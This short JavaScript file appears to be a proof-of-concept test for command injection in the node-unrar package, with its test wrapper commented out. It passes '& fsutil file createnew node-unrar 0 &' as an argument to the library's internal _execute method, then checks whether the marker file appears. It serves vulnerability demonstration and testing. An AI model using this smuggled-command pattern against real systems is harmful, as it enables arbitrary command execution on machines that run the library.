// test("Remote fsutil file createnew execution 0 in node-unrar", (done) => {
//   expect.assertions(2);
  const Unrar = require("node-unrar");
  const fs = require("fs");
  const path = "./node-unrar";
  try {
    if (fs.existsSync(path)) {
      fs.unlinkSync(path);
//       console.log("File removed:", path);
    }
  } catch (err) {
    console.error(err);
  }
  file_exist = fs.existsSync(path);
console.log("{ " + file_exist + ", " + false + " }");
  try {
    var rar = new Unrar("/path/to/file.rar");
    rar._execute([], "& fsutil file createnew node-unrar 0 &", function () {
      file_exist = fs.existsSync(path);
console.log("{ " + file_exist + ", " + true + " }");
      fs.unlink(path, function (err) {
//         done();
      });
    });
  } catch (error) {}
// });
